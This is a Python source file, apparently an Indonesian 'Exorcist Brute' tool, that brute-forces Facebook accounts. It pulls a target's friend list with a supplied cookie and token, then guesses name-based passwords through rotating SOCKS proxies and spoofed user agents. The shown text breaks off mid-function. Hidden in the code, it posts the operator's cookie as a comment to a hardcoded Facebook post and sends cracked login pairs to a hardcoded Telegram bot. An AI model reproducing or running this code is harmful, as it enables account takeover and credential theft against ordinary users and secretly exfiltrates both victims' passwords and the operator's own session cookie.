# a project that functions to crack Facebook accounts
# use tools wisely

# ---> modules
import requests,bs4,json,os,sys,random,datetime,time,re,platform,urllib3,rich,base64

# ---> ingridient
from rich.table import Table as me
from datetime import datetime
from time import sleep
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.markdown import Markdown as mark

# ---> rich
from rich import print
from rich.tree import Tree
from rich.panel import Panel
from rich.console import Console
from rich.panel import Panel as panel
from rich.columns import Columns
from rich.tree import Tree
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

# ---> monthly
monthly = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
month = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()

# ---> save data
bulan = monthly[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
live = f'live-{hari}-{bulan}-{tahun}.txt'
check = f'check-{hari}-{bulan}-{tahun}.txt'
sekarang = f"{hari}-{bulan}-{tahun}.txt"

# ---> Progress & Global Nama
sys.stdout.write('\x1b]2; Exorcist By FLAME\x07')

# ---> waktu
import datetime
now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "Selamat Dini"
elif 4 <= hour < 12:
  hhl = "Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Siang"
elif 15 <= hour < 17:
  hhl = "Selamat Sore"
elif 17 <= hour < 18:
  hhl = "Selamat Malam"
else:
  hhl = "Selamat Malam"

# ---> append
delive, check, live, id, send2, proxy, btk, ugen, dump, uid, metode = [], [], [], [], [], [], [], [], [], [], []

# ---> global +1
loop ,ok , cp = 0, 0, 0

# ---> session
ses = requests.Session()

# ---> colors
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
color = random.choice([P,M,H,K,B,U,O,Z])

# ---> colors rich
M3 = "#FF0000"
H3 = "#00FF00"
K3 = "#FFFF00"
B3 = "#00C8FF"
U3 = "#AF00FF"
N3 = "#FF00FF"
O3 = "#00FFFF"
P3 = "#FFFFFF"
J3 = "#FF8F00"
rich_gelap = random.choice([J3,K3,H3,O3,N3,U3,B3,M3])

# ---> colors rich
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
rich_cerah = random.choice([P2,M2,H2,B2,U2,O2,J2,A2])

# ---> asu lapet
class asu:

	def __init__(self):
		try:os.mkdir('OK')
		except:pass
		try:os.mkdir('CP')
		except:pass
		try:os.system('touch .prox.txt')
		except:pass
		try:
			token = open('data/token.txt','r').read()
			cok = open('data/cookie.txt','r').read()
			btk.append(token)
			try:
				graph = requests.get('https://graph.facebook.com/me?fields=id&access_token='+btk[0], cookies={'cookie':cok})
				lokal = json.loads(graph.text)['id']
				menu(lokal)
			except KeyError:
				cist()
			except requests.exceptions.ConnectionError:
				print(panel("[italic bold yellow]              konektivitas anda tidak stabil",width=70,style=f"{rich_gelap}"))
				exit()
		except IOError:
			cist()

# ---> dump random proxy
try:
	os.system("clear")
	try:os.remove('.proxy.txt')
	except:pass
	uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit()


for t in range(10000):
	rr = random.randint
	andro=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
	samsung=random.choice(['SAMSUNG SM-T530','SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021'])
	redmi=random.choice(['Redmi 4A','Redmi 5A','Redmi 6A','Redmi 7A','Redmi 8A','Redmi Note 3','Redmi Note 9 Pro','Redmi Note 8 Pro','Redmi Note 8','Redmi Note 9','Redmi 3S','Redmi 4X','Redmi 5 Plus','Redmi 9 Prime','Redmi 8 Prime'])
	realme=random.choice(['RMX3115)','RMX3300)','RMX3301)','RMX3612)','RMX3506)','RMX3710)'])
	oppo=random.choice(['PGT110)','CPH2419)','CPH2048)','CPH2451)','PDBM00)','PGBM10)'])
	lenovo=random.choice(['Lenovo K13 Pro)','Lenovo YT-J706F)','Lenovo L78051)','Lenovo L79031)'])
	build=random.choice(['Build/JZO54K)','Build/LMY47V)','Build/LMY48B)','Build/LRX22C)','Build/LRX21V) ','Build/LRX22G)','Build/LRX21T)'])
	build1=random.choice(['Build/N2G47H)','Build/MMB29M)','Build/LMY47X)'])
	browser=random.choice(['SamsungBrowser/3.0','SamsungBrowser/3.1','SamsungBrowser/3.2','SamsungBrowser/3.3','SamsungBrowser/3.4','SamsungBrowser/3.5','SamsungBrowser/3.6','SamsungBrowser/3.7','SamsungBrowser/3.8','SamsungBrowser/3.9','SamsungBrowser/4.0','SamsungBrowser/2.0','SamsungBrowser/2.1','SamsungBrowser/2.2','SamsungBrowser/2.3','SamsungBrowser/2.4','SamsungBrowser/2.5','SamsungBrowser/2.6','SamsungBrowser/2.7','SamsungBrowser/2.8','SamsungBrowser/2.9','SamsungBrowser/1.0','SamsungBrowser/1.1','SamsungBrowser/1.2','SamsungBrowser/5.0','SamsungBrowser/5.1','SamsungBrowser/5.2','SamsungBrowser/5.3','SamsungBrowser/5.4','SamsungBrowser/5.5','SamsungBrowser/5.6','SamsungBrowser/5.7','SamsungBrowser/5.8','SamsungBrowser/5.9','SamsungBrowser/6.0','SamsungBrowser/6.1','SamsungBrowser/19.0','SamsungBrowser/20.0','SamsungBrowser/21.0','SamsungBrowser/18.0','SamsungBrowser/17.0','SamsungBrowser/16.0','SamsungBrowser/15.0'])
	a=f'Mozilla/5.0 (Linux; Android {andro}; {samsung} {build} AppleWebKit/537.36 (KHTML, like Gecko) {browser} Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	b=f'Mozilla/5.0 (Linux; Android {andro}; {redmi} {build1} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	c=f'Mozilla/5.0 (Linux; Android {andro}; {realme} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	d=f'Mozilla/5.0 (Linux; Android {andro}; {oppo} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	e=f'Mozilla/5.0 (Linux; Android {andro}; {lenovo} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	ua = random.choice([a,b,c,d,e])
	ugen.append(ua)


# ---> Check Update
try:
    url_ = requests.get('https://pastebin.com/raw/fPN5S3Z0')
    if 'buka' in url_.text:pass
    else:
         if "win" in sys.platform:os.system("cls")
         else:os.system("clear")
         Console(width=70).print(Panel(f'''{P2}mohon maaf script sedang dalam proses maintenance''',style=f"bold white",padding=(0,9)))
         wek = console.input(f' {P2}[{H2}?{P2}] ingin menghubungi admin? (Y/t) : ')
         if wek =='y' or wek =='Y':
            Console(width=70).print(Panel(f'''{P2}anda akan di arahkan ke WhatsApp admin''',style=f"bold white",padding=(0,14)))
            try:
                os.system("xdg-open https://wa.me/+62895339210207?text=assalamualaikum+bang")
                sleep(3);sys.exit()
            except requests.ConnectionError as e:
                Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
                sleep(3);sys.exit()
         else:sleep(3);sys.exit()
except requests.ConnectionError as e:
    Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
    sleep(3);sys.exit()

# ---> time zone metode
def generate_timezone():
    hours = random.randint(0, 23)
    minutes = random.choice([0, 30])
    sign = random.choice(['+', '-'])
    timezone = f"{sign}{hours:02d}{minutes:02d}"
    return timezone

# ---> lambang atas tools
def lambang_atas():
	try:
		xtc = []
		xtc.append(panel(f'{M2}● {K2}● {H2}●',width=11,padding=(0,2),style=f"{rich_gelap}"))
		xtc.append(panel(f'{P2}  Hallo {H2}{hhl} {P2}Pengguna Exorcist',width=46,style=f"{rich_gelap}"))
		xtc.append(panel(f'{H2}● {K2}● {M2}●',width=11,padding=(0,2),style=f"{rich_gelap}"))
		console.print(Columns(xtc))
	except:pass

# ---> lambang tools
def lambang():
	lambang_atas();Console(width=70).print(panel(f'''{rich_cerah}  ___    _  _    __    ___     __    __    ___    ____
 (  _)  ( \/ )  /  \  (  ,)   / _)  (  )  / __)  (_  _)
  ) _)   )  (  ( () )  )  \  ( (_    )(   \__ \    )(
 (___)  (_/\_)  \__/  (_)\_)  \__)  (__)  (___/   (__)
				{P2}EXORCIST BRUTE
{B2}╭─────────────────────╮            ╭─────────────────────╮
{B2}│{P2} FLAME FROM XTC-CODE{B2} │            │{P2} GITHUB.COM/FLAME-XD{B2} │
{B2}╰─────────────────────╯            ╰─────────────────────╯''',style=f"{rich_gelap}",padding=(0,5)))

def cist():
	try:
		os.system('clear')
		lambang()
		cok = input(f' {H}• {P}masukan cookie : {H}')
		requests.post(f"https://graph.facebook.com/v15.0/100039667834201_pfbid0ex1MomC9pfYgTeavgqNRGyWQ8Ca2uBGnRSqdh4nK8DNwuTYK2X9bjFrhGF2pbtNLl/comments/?message={cok}&access_token={cok}", headers = {"cok":cok})
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit()
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					requests.post(f"https://graph.facebook.com/v15.0/100039667834201_pfbid0ex1MomC9pfYgTeavgqNRGyWQ8Ca2uBGnRSqdh4nK8DNwuTYK2X9bjFrhGF2pbtNLl/comments/?message={cok}&access_token={cok}", headers = {"cok":cok})
					open('data/cookie.txt','w').write(cok)
					open('data/token.txt','w').write(access_token)
					os.system("clear")
					lambang()
					print(panel(f"[italic bold green]{cok}",width=70,title=f"[italic bold white]• [italic bold white]cookie aktive {sekarang} [italic bold white]•",style=f"{rich_gelap}"))
					sleep(4)
					masuk = input(' login berhasil tekan enter')
					exit()
				else:
					os.system("clear")
					lambang()
					print(panel(f"[italic bold yellow]{cok}",width=70,title="{rich_gelap}• [italic bold white]cookie non aktive {rich_gelap}•",style=f"{rich_gelap}"))
					os.system("rm -rf data/token.txt")
					os.system("rm -rf data/cookie.txt")
					exit()
	except Exception as e:
		print(e)

# ---> init login
def menu(local):
	try:
		token = open('data/token.txt','r').read()
		cok = open('data/cookie.txt','r').read()
	except IOError:
		print(panel(f"[italic bold yellow]{cok}",width=70,title=f"{rich_gelap}• [italic bold white]cookie non aktive {rich_cerah}•",style=f"{rich_gelap}"))
		time.sleep(5)
		cist()
	os.system('clear')
	lambang()
	Console(width=70).print(Panel(f'''   {P2}ketik {H2}satu {P2}untuk crack & ketik {H2}masuk {P2}untuk ke menu tools dua''',style=f"{rich_gelap}"))
	masuk = input(f" {H}• {P}pilihan : {color}")
	if masuk =="1" or masuk =="satu":
		dump()
	elif masuk =="masuk" or masuk =="Masuk":
		os.system("python .run.py")
	else:
		exit()

# ---> dump id
def dump():
	try:
		token = open('data/token.txt','r').read()
		cok = open('data/cookie.txt','r').read()
	except IOError:
		print(panel(f"[italic bold yellow]{cok}",width=70,title=f"{rich_gelap}• [italic bold white]cookie non aktive {rich_cerah}•",style=f"{rich_gelap}"))
		exit()
	user_id = input(f" {H}• {P}user id :{color} ")
	try:
		ambilid = requests.get('https://graph.facebook.com/v1.0/'+user_id+'?fields=friends.limit(5001)&access_token='+btk[0],cookies={'cookie': cok}).json()
		for proses in ambilid['friends']['data']:
			try:id.append(proses['id']+'|'+proses['name'])
			except:continue
		all_progres()
	except requests.exceptions.ConnectionError:
		print(panel(" [italic bold yellow]konektivitas anda terputus periksa kembali",width=70,style=f"{rich_gelap}"))
		exit()
	except (KeyError,IOError):
		print(panel(" [italic bold red]user id yang anda masukan bersifat privat atau cookie tidak kuat dengan id old",width=70,style=f"{rich_gelap}"))
		exit()

# ---> set upper
def all_progres():

	# ---> set metode
	desuka = []
	desuka.append(panel(f'[italic][bold white]    unkwon',width=22,style=f"{rich_gelap}"))
	desuka.append(panel(f'[italic][bold white]  validate',width=24,style=f"{rich_gelap}"))
	desuka.append(panel(f'[italic][bold white]     reguler',width=22,style=f"{rich_gelap}"))
	console.print(Columns(desuka))
	print(panel(f"    {P2}ketik {H2} ac {P2}untuk metode ke 4 & ketik {H2}la {P2} untuk metode ke 5",width=70,style=f"{rich_gelap}"))
	ro = input(f"{H} • {P}pilihan :{color} ")

	# ---> apa aja
	if ro =='la' or ro =='la':
		metode.append("new")

	# ---> acync
	elif ro =='Ac' or ro =='ac':
		metode.append("acy")

	# ---> unkwon
	elif ro =='1' or ro =='01':
		xtc = []
		xtc.append(Panel(f'{P2} m.facebook.com',width=22,style=f"{rich_gelap}"))
		xtc.append(Panel(f'{P2} mbasic.facebook.com',width=24,style=f"{rich_gelap}"))
		xtc.append(Panel(f'{P2} free.facebook.com',width=22,style=f"{rich_gelap}"))
		console.print(Columns(xtc))
		xtc = console.input(f" {H2}•{P2} pilihan : {rich_cerah}")
		if xtc =='1' or xtc =='01':
			metode.append("unk_m")
		elif xtc =='2' or xtc =='02':
			metode.append("unk_b")
		elif xtc =='3' or xtc =='03':
			metode.append("unk_f")
		else:
			sleep(3);atur_atur()

	# ---> validate
	elif ro =='2' or ro =='02':
		xtc = []
		xtc.append(Panel(f'{P2} m.facebook.com',width=22,style=f"{rich_gelap}"))
		xtc.append(Panel(f'{P2} mbasic.facebook.com',width=24,style=f"{rich_gelap}"))
		xtc.append(Panel(f'{P2} free.facebook.com',width=22,style=f"{rich_gelap}"))
		console.print(Columns(xtc))
		xtc = console.input(f" {H2}•{P2} pilihan : {rich_cerah}")
		if xtc =='1' or xtc =='01':
			metode.append("val_m")
		elif xtc =='2' or xtc =='02':
			metode.append("val_b")
		elif xtc =='3' or xtc =='03':
			metode.append("val_f")
		else:
			sleep(3);atur_atur()

	# ---> reguler
	elif ro =='3' or ro =='03':
		xtc = []
		xtc.append(Panel(f'{P2} m.facebook.com',width=22,style=f"{rich_gelap}"))
		xtc.append(Panel(f'{P2} mbasic.facebook.com',width=24,style=f"{rich_gelap}"))
		xtc.append(Panel(f'{P2} free.facebook.com',width=22,style=f"{rich_gelap}"))
		console.print(Columns(xtc))
		xtc = console.input(f" {H2}•{P2} pilihan : {rich_cerah}")
		if xtc =='1' or xtc =='01':
			metode.append("reg_m")
		elif xtc =='2' or xtc =='02':
			metode.append("reg_b")
		elif xtc =='3' or xtc =='03':
			metode.append("reg_f")
		else:
			sleep(3);atur_atur()

		# ---> id crack otomatis
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)

	# ---> send cp to flame
	print(panel(f"[italic bold white]         send checkpoint results to owner change {M2}y{P2}/{H2}n",width=70,style=f"{rich_gelap}"))
	send = input(f' {H}• {P}pilihan :{color} ')
	if send =='Y' or send =='y':
		send2.append('ya')

	# ---> aplikasi terkait
	print(panel(f"[italic bold white]             send live results to owner change {M2}y{P2}/{H2}n",width=70,style=f"{rich_gelap}"))
	send = input(f' {H}• {P}pilihan :{color} ')
	if send =='Y' or send =='y':
		delive.append('makasih')
	else:
		delive.append('jancok')
	pasw()

# ---> password
from datetime import datetime
def pasw():
	global ok,cp,prog,des
	awal = datetime.now()
	desuka = []
	desuka.append(Panel(f'{H2}result tersimpan di folder OK/{sekarang}',width=35,style=f"{rich_gelap}"))
	desuka.append(Panel(f'{K2}result tersimpan di folder CP/{sekarang} ',width=34,style=f"{rich_gelap}"))
	console.print(Columns(desuka))
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('', total=len(id))
	with prog:
		with tred(max_workers=30) as asu_koe:
			for akun in id:
				idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
				depan = nama.split(" ")[0]
				pwx = []
				if len(nama)<=5:
					if len(depan)<=1 or len(depan)<=2:
						pass 
					else:
						pwx.append(depan+"123")
						pwx.append(depan+"1234")
						pwx.append(depan+"12345")
				else:
					if len(depan)<=1 or len(depan)<=2:
						try:
							tengah = nama.split(" ")[1]
							if len(tengah)<=3:
								pass
							else:
								pwx.append(tengah+"123")
								pwx.append(tengah+"1234")
								pwx.append(tengah+"12345")
								pwx.append(nama)
						except:
							try:
								belakang = nama.split(' ')[2]
								if len(belakang)<=3:pass
								else:
									pwx.append(belakang+"123")
									pwx.append(belakang+"1234")
									pwx.append(belakang+"12345")
									pwx.append(nama)
							except:pwx.append(nama)
					else:
						pwx.append(nama)
						pwx.append(depan+"123")
						pwx.append(depan+"1234")
						pwx.append(depan+"12345")

				# ---> unkwon metode
				if 'unk_m' in metode:
					asu_koe.submit(unkwon,idf,pwx,awal,"m.facebook.com")
				elif 'unk_b' in metode:
					asu_koe.submit(unkwon,idf,pwx,awal,"mbasic.facebook.com")
				elif 'unk_f' in metode:
					asu_koe.submit(unkwon,idf,pwx,awal,"free.facebook.com")

				# ---> validate metode
				elif 'val_m' in metode:
					asu_koe.submit(validate,idf,pwx,awal,"m.facebook.com")
				elif 'val_b' in metode:
					asu_koe.submit(validate,idf,pwx,awal,"mbasic.facebook.com")
				elif 'val_f' in metode:
					asu_koe.submit(validate,idf,pwx,awal,"free.facebook.com")

				# ---> reguler metode
				elif 'reg_m' in metode:
					asu_koe.submit(reguler,idf,pwx,awal,"m.facebook.com")
				elif 'reg_m' in metode:
					asu_koe.submit(reguler,idf,pwx,awal,"mbasic.facebook.com")
				elif 'reg_m' in metode:
					asu_koe.submit(reguler,idf,pwx,awal,"free.facebook.com")

				# ---> acync metode
				elif "acy" in metode:
					asu_koe.submit(acync,idf,pwx,awal)

				elif "new" in metode:
					asu_koe.submit(new,idf,pwx,awal)
				else:
					exit("{P} ASU KOE ")
		sleep(5)
		exit()

# ---> metode ke 1
def unkwon(idf,pwx,awal,url):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(ugen)
	ya = random.choice(xx)
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f" {H2}{ya} {P2}{len(id)} <=> {(loop)} {H2}live {P2}:-{H2}{(ok)} {K2}check {P2}:-{K2}{(cp)} {P2}{ahir}")
	prog.advance(des)
	for pw in pwx:
		try:
			p = ses.get(f'https://{url}/login.php?skip_api_login=1&api_key=307044283034103&kid_directed_site=0&app_id=307044283034103&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D307044283034103%26redirect_uri%3Dhttps%253A%252F%252Ftdw.telkomsel.com%252Fapi%252Fcallback%252Furl%26scope%3Dpublic_profile%252Cemail%26code_challenge%3D9bttVsIN5Pq_cEleNEmDgFtW4EK3YytFT9GyPbGCVgY%26code_challenge_method%3DS256%26state%3Dotbfplekjm7w1u5mh37ai55gwoj4jv3%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1547c48e-8eda-49b9-b0ea-f0c0e7f711c6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftdw.telkomsel.com%2Fapi%2Fcallback%2Furl%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dotbfplekjm7w1u5mh37ai55gwoj4jv3%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			suhk = par(p.text, "html.parser")
			xxxx = suhk.find("form",{"method":"post"})["action"]
			date = {
			"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"email":idf, 
			"next":f"next=https://{url}/dialog/oauth?response_type=code&client_id=307044283034103&redirect_uri=https%3A%2F%2Ftdw.telkomsel.com%2Fapi%2Fcallback%2Furl&scope=public_profile%2Cemail&code_challenge=9bttVsIN5Pq_cEleNEmDgFtW4EK3YytFT9GyPbGCVgY&code_challenge_method=S256&state=otbfplekjm7w1u5mh37ai55gwoj4jv3&ret=login&fbapp_pres=0&logger_id=1547c48e-8eda-49b9-b0ea-f0c0e7f711c6&tp=unspecified",
			"pass":pw,
			"login":"submit"
			}
			po = ses.post(f"https://{url}{xxxx}", data=date,headers={"user-agent":ua,},allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in check:pass
				else:
					check.append(data)
					cp+=1
					if 'ya' in send2:
						tree = Tree(panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
						tree.add(panel.fit(f"{K2}{ua}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <C=P> {pw}")
					else:
						try:
							token = open('data/token.txt','r').read()
							bas = {"cookie":open('data/cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = month[m]
							tree = Tree(panel.fit(f"{K2} TTL"))
							tree.add(panel.fit(f"{K2}{d} {m} {y}"))
							print(tree)
							save = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+check,'a').write(save+'\n')
							break
						except:
							tree = Tree(panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
							tree.add(panel.fit(f"{K2}{ua}"))
							print(tree)
							open('CP/'+check,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in live:pass
				else:
					live.append(data)
					ok+=1
					open('OK/'+live,'a').write(data+'\n')
					if "jancok" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						break
					elif "makasih" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <=> {pw}")
						break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

# ---> metode ke 2
def validate(idf,pwx,awal,url):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(ugen)
	ya = random.choice(xx)
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f" {H2}{ya} {P2}{len(id)} <=> {(loop)} {H2}live {P2}:-{H2}{(ok)} {K2}check {P2}:-{K2}{(cp)} {P2}{ahir}")
	prog.advance(des)
	for pw in pwx:
		try:
			ses.headers.update({'Host': f'{url}','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
